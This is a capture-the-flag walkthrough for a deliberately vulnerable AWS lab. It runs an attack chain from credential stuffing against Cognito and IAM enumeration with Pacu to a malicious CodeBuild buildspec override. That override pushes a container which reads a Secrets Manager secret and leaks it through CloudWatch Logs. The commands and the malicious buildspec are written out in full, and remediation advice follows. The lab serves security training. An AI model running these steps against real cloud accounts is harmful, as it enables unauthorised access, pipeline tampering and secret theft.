# Walkthrough

## Environment

All commands run in **WSL or Linux/Mac terminal**.
The web portal (Step 1) is browser-only for reconnaissance — no direct interaction required.

> **Windows users:** Use WSL for all CLI commands. `pacu` requires WSL.

---

## Step 1: Reconnaissance

```bash
cd scenarios/aws/03-supply-chain/dam-breaks/terraform
terraform output scenario_entrypoint_url
```

Open the URL in your browser. The **BeaverPay Developer Portal** appears — a B2B collaborator portal.

![BeaverPay Developer Portal](./assets/images/portal-homepage.png)

The page has two information cards visible without logging in. The **Access Information** card exposes the authentication configuration directly:

| Field | Value |
|-------|-------|
| Auth Endpoint | `cognito-idp.us-east-1.amazonaws.com` |
| Auth Flow | `USER_PASSWORD_AUTH` |
| MFA | `Optional` |

Key findings:
- **Auth Flow: `USER_PASSWORD_AUTH`** — username/password directly against Cognito, no challenge-response
- **MFA: Optional** — not enforced → credential stuffing succeeds with no second factor
- **Collaborator Resources card** — lists CodeBuild, ECR, ECS Fargate → confirms what services are in scope

The `/config` endpoint provides the Cognito IDs needed for the API calls:

```bash
curl -s http://<portal-ip>/config | python3 -m json.tool
```

Output:
```json
{
  "clientId": "xxxxxxxxxxxxxxxxxxxxxxxxxx",
  "poolId": "us-east-1_xxxxxxxxx",
  "identityPoolId": "us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "accountId": "123456789012",
  "region": "us-east-1"
}
```

---

## Step 2: Cognito Authentication

### Step 2-1: Credential Stuffing

`USER_PASSWORD_AUTH` with MFA set to Optional (not enforced) means any valid username/password pair authenticates immediately — no second factor, no adaptive challenge. This is the prerequisite for credential stuffing.

The target domain is `ottercode.kr`. Test known breached credentials against the Cognito endpoint:

```bash
aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id "<clientId from /config>" \
  --auth-parameters USERNAME=j.park@ottercode.kr,PASSWORD=Otter2022! \
  --region us-east-1
```

Output:
```json
{
  "AuthenticationResult": {
    "AccessToken": "...",
    "IdToken": "eyJ...",
    "RefreshToken": "..."
  }
}
```

No MFA challenge. Authentication succeeds on first attempt. `j.park@ottercode.kr` is an active OtterCode collaborator account.

> **Why this works:** Cognito with `USER_PASSWORD_AUTH` and MFA not enforced has no built-in rate limiting by default. Automated credential stuffing against the endpoint is indistinguishable from normal login traffic without Advanced Security Features (ASF) enabled.

### Step 2-2: Log in via the Developer Portal

Open the portal URL in your browser. Enter the credentials:

- Email: `j.park@ottercode.kr`
- Password: `Otter2022!`

![BeaverPay Portal Login](./assets/images/portal-login.png)

The portal authenticates against Cognito User Pool using `USER_PASSWORD_AUTH` — no MFA challenge fires because MFA is not enforced.

After login, the dashboard automatically exchanges the Cognito JWT for temporary AWS credentials via the Identity Pool and displays them ready to copy:

Click **Copy as env vars** and paste into your terminal:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="xxxxxxxx"
export AWS_SESSION_TOKEN="IQoJ..."
export AWS_DEFAULT_REGION="us-east-1"
```

### Step 2-3 (Alternative): CLI-only Authentication

If browser access is unavailable, obtain Collaborator credentials entirely via CLI.

First, retrieve the Cognito configuration from the portal's `/config` endpoint:

```bash
PORTAL_URL="http://<portal-ip>"
CONFIG=$(curl -s $PORTAL_URL/config)

CLIENT_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['clientId'])")
POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['poolId'])")
IDENTITY_POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['identityPoolId'])")
```

Then authenticate:

```bash
ID_TOKEN=$(aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id "$CLIENT_ID" \
  --auth-parameters USERNAME=j.park@ottercode.kr,PASSWORD=Otter2022! \
  --region us-east-1 \
  --query 'AuthenticationResult.IdToken' \
  --output text)

IDENTITY_ID=$(aws cognito-identity get-id \
  --identity-pool-id "$IDENTITY_POOL_ID" \
  --logins "cognito-idp.us-east-1.amazonaws.com/${POOL_ID}=$ID_TOKEN" \
  --region us-east-1 \
  --query 'IdentityId' \
  --output text)

CREDS=$(aws cognito-identity get-credentials-for-identity \
  --identity-id "$IDENTITY_ID" \
  --logins "cognito-idp.us-east-1.amazonaws.com/${POOL_ID}=$ID_TOKEN" \
  --region us-east-1 \
  --query 'Credentials')

export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretKey'])")
export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SessionToken'])")
export AWS_DEFAULT_REGION="us-east-1"
```

> The portal performs this same sequence client-side. `initiate-auth` authenticates against the User Pool, `get-id` resolves the Identity Pool identity, and `get-credentials-for-identity` exchanges the JWT for temporary AWS credentials via `AssumeRoleWithWebIdentity`.

### Step 2-4: Verify Identity

```bash
aws sts get-caller-identity
```

Output:
```json
{
  "Arn": "arn:aws:sts::123456789012:assumed-role/dam-breaks-CollaboratorDeveloperRole-xxxxxxxx/CognitoIdentityCredentials"
}
```

You are now authenticated as `CollaboratorDeveloperRole` — a role with limited but exploitable AWS permissions.

> **Under the hood:** The portal calls `cognito-identity:GetId` then `cognito-identity:GetCredentialsForIdentity` client-side using your IdToken. The Identity Pool maps authenticated Cognito users to `CollaboratorDeveloperRole` via `AssumeRoleWithWebIdentity`. No additional configuration is needed.

---

## Step 3: IAM Enumeration

### Step 3-1: Manual enumeration attempts (AWS CLI)

Credentials obtained. First instinct: find out what this role can do.

The ARN from Step 2-4 tells us something immediately:

```
arn:aws:sts::123456789012:assumed-role/dam-breaks-CollaboratorDeveloperRole-xxxxxxxx/CognitoIdentityCredentials
```

This is an **assumed-role**, not an IAM user. Common user-based enumeration commands will fail:

```bash
aws iam get-user
# Error: Must specify userName when calling with non-User credentials.

aws iam list-user-policies --user-name me
# Error: NoSuchEntity

aws iam list-attached-user-policies --user-name me
# Error: NoSuchEntity
```

The principal is a role assumed via Cognito. Try enumerating the role itself:

```bash
ROLE_NAME="dam-breaks-CollaboratorDeveloperRole-xxxxxxxx"

aws iam list-role-policies --role-name "$ROLE_NAME"
# Output: { "policyNames": ["dam-breaks-collaborator-policy-xxxxxxxx"] }

aws iam get-role-policy \
  --role-name "$ROLE_NAME" \
  --policy-name "dam-breaks-collaborator-policy-xxxxxxxx"
```

This returns the full inline policy — but IAM policy documents alone don't tell you what *actually works*. Conditions, SCPs, permission boundaries, and resource-level restrictions can all silently block actions that look allowed on paper.

The real question is: **what can I actually call right now?**

Trial and error with individual services:

```bash
aws s3 ls
# An error occurred (AccessDenied)

aws lambda list-functions --region us-east-1
# An error occurred (AccessDenied)

aws ec2 describe-instances --region us-east-1
# An error occurred (AccessDenied)

aws codebuild list-projects --region us-east-1
# { "projects": ["dam-breaks-webapp-qa-build-xxxxxxxx", "dam-breaks-webapp-prod-build-xxxxxxxx"] }
```

Something works. But manually probing every AWS service and action is not practical — there are hundreds of services and thousands of actions. Miss one and you miss the attack path.

A more systematic approach is needed.

### Step 3-2: IAM Enumeration with Pacu

Pacu's `iam__enum_permissions` module uses `iam:SimulatePrincipalPolicy` — an IAM API that lets any principal test which actions are allowed against which resources, without actually calling them. It's a legitimate IAM feature that attackers abuse for permission discovery.

```bash
pacu
```

Inside Pacu:

```
Pacu (dam-breaks:No Keys Set) > 0
  Session name: dam-breaks

Pacu (dam-breaks:No Keys Set) > set_keys
  Key alias: collaborator
  Access key ID: ASIA...
  Secret access key: xxxxxx
  Session token (optional): IQoJ...

Pacu (dam-breaks:collaborator) > run iam__enum_permissions
```

Output:
```
[iam__enum_permissions] Enumerating permissions for: collaborator

[iam__enum_permissions] Starting permission enumeration via iam:SimulatePrincipalPolicy...

[+] Confirmed ALLOWED actions:
  iam:SimulatePrincipalPolicy     ← this call itself — Pacu uses it to enumerate
  iam:GetRole
  iam:GetRolePolicy
  iam:ListRolePolicies
  iam:ListAttachedRolePolicies
  codebuild:ListProjects
  codebuild:BatchGetProjects
  codebuild:StartBuild            ← no Condition on buildspec — override possible
  codebuild:BatchGetBuilds
  ecr:GetAuthorizationToken
  ecr:DescribeRepositories
  ecr:DescribeImages
  ecs:ListClusters
  ecs:ListServices
  ecs:DescribeServices
  ecs:DescribeTaskDefinition
  ecs:ListTasks
  ecs:DescribeTasks
  logs:DescribeLogGroups
  logs:DescribeLogStreams
  logs:GetLogEvents
  logs:FilterLogEvents

[-] Confirmed DENIED actions:
  codebuild:UpdateProject         ← persistent project modification blocked
  codebuild:DeleteProject
  ecr:PutImage                    ← direct ECR push blocked (must go through CodeBuild)
  secretsmanager:ListSecrets      ← direct Secrets Manager access blocked
  secretsmanager:GetSecretValue
  iam:AttachRolePolicy
  iam:CreateRole

[iam__enum_permissions] Pacu data saved: iam__enum_permissions
```

The DENIED list is as informative as the ALLOWED list. `ecr:PutImage` is blocked — direct ECR push is not an option. `secretsmanager:GetSecretValue` is blocked — the flag cannot be read directly. But `codebuild:StartBuild` is allowed, and CodeBuild has ECR push permissions via its service role. The attack path is forced through the build pipeline.

### Why `codebuild:StartBuild` is the critical finding

When Pacu confirms `codebuild:StartBuild` is allowed, the key question is: **is there an IAM Condition restricting which buildspec can be used?**

Use `iam:GetRolePolicy` to inspect the policy directly. Replace `xxxxxxxx` with the 8-character suffix visible in the ARN from Step 2-4.

```bash
aws iam get-role-policy \
  --role-name "dam-breaks-CollaboratorDeveloperRole-xxxxxxxx" \
  --policy-name "dam-breaks-collaborator-policy-xxxxxxxx" \
  --query 'PolicyDocument.Statement[?Sid==`CodeBuildAccess`]'
```

Output:
```json
[
  {
    "Sid": "CodeBuildAccess",
    "Effect": "Allow",
    "Action": [
      "codebuild:ListProjects",
      "codebuild:BatchGetProjects",
      "codebuild:StartBuild",
      "codebuild:BatchGetBuilds"
    ],
    "Resource": "*"
  }
]
```

No `Condition` block. A secure configuration would include:

```json
{
  "Condition": {
    "StringEquals": {
      "codebuild:buildspec": "buildspec.yaml"
    }
  }
}
```

Without this Condition, `--buildspec-override` accepts any arbitrary buildspec.

Key findings:
- `codebuild:StartBuild` with no Condition → `buildspecOverride` is unrestricted
- `ecr:PutImage` denied → ECR push must go through CodeBuild (attack path is forced through the build pipeline)
- `secretsmanager` denied → Secrets Manager access requires ECS Task Role — exploitable via CloudWatch Logs exfiltration

---

## Step 4: CodeBuild Reconnaissance

Pacu confirmed `codebuild:StartBuild` with no IAM Condition — `buildspecOverride` is unrestricted. Before crafting a malicious buildspec, map the environment: which projects exist, what environment variables they expose, and which service role they use.

```bash
aws codebuild list-projects --region us-east-1
```

Output:
```json
{
  "projects": [
    "dam-breaks-webapp-qa-build-xxxxxxxx",
    "dam-breaks-webapp-prod-build-xxxxxxxx"
  ]
}
```

```bash
aws codebuild batch-get-projects \
  --names "dam-breaks-webapp-prod-build-xxxxxxxx" \
  --region us-east-1
```

Output:
```json
{
  "projects": [{
    "environment": {
      "environmentVariables": [
        { "name": "REPOSITORY_URI", "value": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx" },
        { "name": "AWS_DEFAULT_REGION", "value": "us-east-1" },
        { "name": "ECS_CLUSTER",  "value": "dam-breaks-prod-cluster-xxxxxxxx" },
        { "name": "ECS_SERVICE",  "value": "dam-breaks-webapp-service-xxxxxxxx" },
        { "name": "SECRET_ARN",   "value": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverpay/prod/flag-xxxxxxxx" }
      ]
    },
    "serviceRole": "arn:aws:iam::123456789012:role/dam-breaks-CodeBuildProdServiceRole-xxxxxxxx"
  }]
}
```

`ECS_CLUSTER`, `ECS_SERVICE`, `SECRET_ARN` — these values are exposed here and can be referenced directly inside the malicious buildspec.

---

## Step 5: ECR Reconnaissance

`REPOSITORY_URI` is now known from the CodeBuild environment variables. The attack plan requires pushing a malicious image to this repository. `ecr:PutImage` was denied in Step 3 — a direct push is blocked. The only path to ECR is through CodeBuild, which has its own service role with push permissions. Before writing the buildspec, confirm the tag mutability of the target repository.

```bash
aws ecr describe-repositories \
  --region us-east-1 \
  --query 'repositories[0].{name:repositoryName,uri:repositoryUri,mutability:imageTagMutability}'
```

Output:
```json
{
  "name": "dam-breaks-beaverpay-webapp-xxxxxxxx",
  "uri": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx",
  "mutability": "MUTABLE"
}
```

Key findings:
- `MUTABLE` — `latest` tag can be overwritten without restriction

---

## Step 6: ECS Reconnaissance

The ECR tag is `MUTABLE` — overwriting `:latest` is possible. Now confirm the ECS side: will ECS auto-deploy when the image changes, or is there a manual approval gate? And does the Task Role actually have `secretsmanager:GetSecretValue`? A malicious container that deploys but can't read the secret is useless.

```bash
aws ecs describe-services \
  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
  --services "dam-breaks-webapp-service-xxxxxxxx" \
  --region us-east-1 \
  --query 'services[0].{deploymentController:deploymentController,circuitBreaker:deploymentConfiguration.deploymentCircuitBreaker}'
```

Output:
```json
{
  "deploymentController": { "type": "ECS" },
  "circuitBreaker": { "enable": false, "rollback": false }
}
```

```bash
aws ecs describe-task-definition \
  --task-definition "dam-breaks-webapp-xxxxxxxx" \
  --region us-east-1 \
  --query 'taskDefinition.taskRoleArn' \
  --output text
```

Output:
```
arn:aws:iam::123456789012:role/dam-breaks-ecs-task-role-xxxxxxxx
```

Key findings:
- Rolling deployment (`ECS`) — no manual approval gate, new image deploys automatically
- Circuit breaker disabled — failed container won't auto-rollback and alert defenders
- `latest` tag referenced — overwriting ECR `:latest` triggers deployment immediately
- Task Role confirmed — the malicious container will inherit `secretsmanager:GetSecretValue` automatically via the ECS credential endpoint (`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`)

All prerequisites confirmed. The attack chain is viable end-to-end.

---

## Step 7: buildspec-override Attack

### Step 7-1: Create malicious buildspec file

The attack chain is now fully mapped:
1. `codebuild:StartBuild` + no Condition → buildspec is fully replaceable
2. CodeBuild service role has ECR push permissions → malicious image can reach ECR
3. ECR tag is MUTABLE → `:latest` can be overwritten silently
4. ECS rolling deploy with no approval gate → new image deploys automatically
5. ECS Task Role has `secretsmanager:GetSecretValue` → container reads the flag on startup
6. CloudWatch Logs captures stdout → flag is readable via `logs:FilterLogEvents`

The malicious image doesn't need a reverse shell or outbound connection. It only needs to call one AWS API and write the result to stdout.

```bash
cat > /tmp/buildspec.json << 'EOF'
{
  "version": "0.2",
  "phases": {
    "pre_build": {
      "commands": [
        "aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin $REPOSITORY_URI"
      ]
    },
    "build": {
      "commands": [
        "mkdir -p /tmp/app",
        "echo '#!/bin/sh' > /tmp/app/exfil.sh",
        "echo \"aws secretsmanager get-secret-value --secret-id $SECRET_ARN --region us-east-1 --query SecretString --output text\" >> /tmp/app/exfil.sh",
        "echo 'sleep infinity' >> /tmp/app/exfil.sh",
        "printf 'FROM public.ecr.aws/docker/library/alpine:3\\nRUN apk add --no-cache aws-cli\\nCOPY exfil.sh /exfil.sh\\nRUN chmod +x /exfil.sh\\nCMD [\"/exfil.sh\"]\\n' > /tmp/app/Dockerfile",
        "docker build -t $REPOSITORY_URI:latest /tmp/app/"
      ]
    },
    "post_build": {
      "commands": [
        "docker push $REPOSITORY_URI:latest",
        "aws ecs update-service --cluster $ECS_CLUSTER --service $ECS_SERVICE --force-new-deployment --region us-east-1"
      ]
    }
  }
}
EOF
```

> **Why no reverse shell:** No attacker-controlled listener is needed. The ECS Task Role already has `secretsmanager:GetSecretValue` on the flag ARN — the container only needs to call the AWS API and log the result. CloudWatch Logs is already configured on this ECS cluster, so all container stdout is captured automatically.

> `$SECRET_ARN` is expanded to the actual ARN value (discovered in Step 4) **during the CodeBuild build phase** and baked directly into `exfil.sh`. When the ECS task container runs, it has the hardcoded ARN — no CodeBuild variables are passed to ECS.

> `$ECS_CLUSTER`, `$ECS_SERVICE` — inherited from the CodeBuild project's environment variables (discovered in Step 4). They remain available even when the entire buildspec is replaced via `buildspecOverride`.

### Step 7-2: Execute malicious build

```bash
aws codebuild start-build \
  --project-name "dam-breaks-webapp-prod-build-xxxxxxxx" \
  --buildspec-override file:///tmp/buildspec.json \
  --region us-east-1 \
  --query 'build.{id:id,status:buildStatus}'
```

Output:
```json
{
    "id": "dam-breaks-webapp-prod-build-xxxxxxxx:<build-uuid>",
    "status": "IN_PROGRESS"
}
```

Copy the `id` value from the output above, then poll for completion:

```bash
BUILD_ID="dam-breaks-webapp-prod-build-xxxxxxxx:<build-uuid>"
aws codebuild batch-get-builds \
  --ids "$BUILD_ID" \
  --region us-east-1 \
  --query 'builds[0].buildStatus'
```

Expected output when complete:
```
"SUCCEEDED"
```

> **Note:** Git repository is untouched. Source code modification occurred only inside the build server memory.

---

## Step 8: ECS Deployment

The malicious buildspec's `post_build` phase runs `aws ecs update-service --force-new-deployment`. The CodeBuild service role has `ecs:UpdateService` — this call is not blocked. ECS starts a rolling deployment with the new `:latest` image.

```bash
aws ecs wait services-stable \
  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
  --services "dam-breaks-webapp-service-xxxxxxxx" \
  --region us-east-1
```

> **Note:** `ecs wait` may return immediately. Verify the service is actually stable by running:

```bash
aws ecs describe-services \
  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
  --services "dam-breaks-webapp-service-xxxxxxxx" \
  --region us-east-1 \
  --query 'services[0].{running:runningCount,pending:pendingCount,desired:desiredCount}'
```

Expected output:
```json
{
    "running": 1,
    "pending": 0,
    "desired": 1
}
```

Once `running` equals `desired` and `pending` is 0, the exfiltration container has started and called Secrets Manager using the ECS Task Role.

---

## Step 9: FLAG Extraction via CloudWatch Logs

The container started, called `secretsmanager:GetSecretValue`, and printed the result to stdout. ECS is configured with CloudWatch Logs as its log driver — every line of stdout is forwarded automatically to `/ecs/<task-definition-name>`. The Collaborator role has `logs:FilterLogEvents` confirmed in Step 3 — this is standard developer read access for debugging, not a suspicious permission on its own.

Replace `xxxxxxxx` with the suffix from the ARN shown in Step 2-4.

```bash
aws logs filter-log-events \
  --log-group-name "/ecs/dam-breaks-webapp-xxxxxxxx" \
  --region us-east-1 \
  --filter-pattern "flag" \
  --query 'events[0].message' \
  --output text
```

Output:
```json
{
  "flag": "FLAG{th3_c0mm1t_w4s_cl34n_but_y0u_w3r3_n0t}",
  "message": "Congratulations. The dam has broken.",
  "internal_note": "The build succeeded. The logs are clean. Nobody noticed.",
  "git_status": "nothing to commit, working tree clean",
  "build_status": "BUILD SUCCEEDED"
}
```

---

## Attack Chain Summary

```
BeaverPay Developer Portal
↓ Credential stuffing — no MFA, no ASF rate limiting
Cognito USER_PASSWORD_AUTH
↓ JWT obtained immediately, no MFA challenge
Cognito Identity Pool
↓ JWT → CollaboratorDeveloperRole temporary credentials
Pacu iam__enum_permissions
↓ codebuild:StartBuild allowed, no Condition → buildspecOverride unrestricted
↓ ecr:PutImage denied, secretsmanager denied → attack path forced through CodeBuild + ECS
iam:GetRolePolicy → IAM policy confirmed → Condition block missing
↓
CodeBuild batch-get-projects
↓ ECS_CLUSTER, ECS_SERVICE, SECRET_ARN environment variables exposed
buildspecOverride via file:///tmp/buildspec.json
↓ Malicious buildspec executed — Git repository untouched
ECR :latest push — MUTABLE tag overwritten
↓ Malicious image replaces legitimate image (Alpine + aws-cli, exfil.sh baked in)
ECS Rolling Deploy — no approval gate, circuit breaker disabled
↓ Malicious container started automatically (~3 min)
ECS Task Role: secretsmanager:GetSecretValue → flag output to stdout
↓ CloudWatch Logs captures container stdout automatically
logs:FilterLogEvents with CollaboratorDeveloperRole
↓
FLAG{th3_c0mm1t_w4s_cl34n_but_y0u_w3r3_n0t}
```

---

## Key Techniques

### buildspecOverride — Git Integrity Bypass

```bash
cat > /tmp/buildspec.json << 'EOF'
{ ... }
EOF

aws codebuild start-build \
  --buildspec-override file:///tmp/buildspec.json
```

### CloudWatch Logs as Exfiltration Channel

```bash
aws logs filter-log-events \
  --log-group-name "/ecs/dam-breaks-webapp-xxxxxxxx" \
  --filter-pattern "flag" \
  --query 'events[0].message' \
  --output text
```

### IAM Condition Missing — buildspec Lock Bypass

```json
{
  "Condition": {
    "StringEquals": {
      "codebuild:buildspec": "buildspec.yaml"
    }
  }
}
```

---

## Lessons Learned

1. **MFA Enforcement** — Set Cognito MFA to `REQUIRED`.
2. **IAM Resource Scope** — Specify exact project ARNs instead of wildcard `*`.
3. **buildspec Condition** — Add `codebuild:buildspec` IAM Condition to prevent `buildspecOverride`.
4. **ECR Image Signing** — Enforce image signature verification (AWS Signer / Cosign).
5. **Deployment Gate** — Use Blue/Green deployment with manual approval gate.
6. **ECS Outbound Restriction** — Restrict Security Group outbound to HTTPS only. Note: this prevents reverse shells but not CloudWatch Logs exfiltration (which uses HTTPS). Combine with least-privilege Task Role IAM policy.
7. **Build Alert Monitoring** — Treat CI/CD alerts as high-priority signals, not noise.

---

## Remediation

### Cognito — Enforce MFA

```hcl
resource "aws_cognito_user_pool" "developer_portal_userpool" {
  mfa_configuration = "ON"

  software_token_mfa_configuration {
    enabled = true
  }

  user_pool_add_ons {
    advanced_security_mode = "ENFORCED"
  }
}
```

### IAM — Restrict CodeBuild Permissions

```json
{
  "Effect": "Allow",
  "Action": ["codebuild:StartBuild"],
  "Resource": "arn:aws:codebuild:us-east-1:*:project/dam-breaks-webapp-qa-*",
  "Condition": {
    "StringEquals": {
      "codebuild:buildspec": "buildspec.yaml"
    }
  }
}
```

### ECR — Enforce Image Immutability

```hcl
resource "aws_ecr_repository" "webapp_ecr" {
  image_tag_mutability = "IMMUTABLE"
}
```

### ECS — Blue/Green Deployment with Approval

```hcl
resource "aws_ecs_service" "webapp_service" {
  deployment_controller {
    type = "CODE_DEPLOY"
  }
  deployment_circuit_breaker {
    enable   = true
    rollback = true
  }
}
```

### ECS Security Group — Restrict Outbound

```hcl
resource "aws_security_group" "ecs_task_sg" {
  egress {
    description = "HTTPS only"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```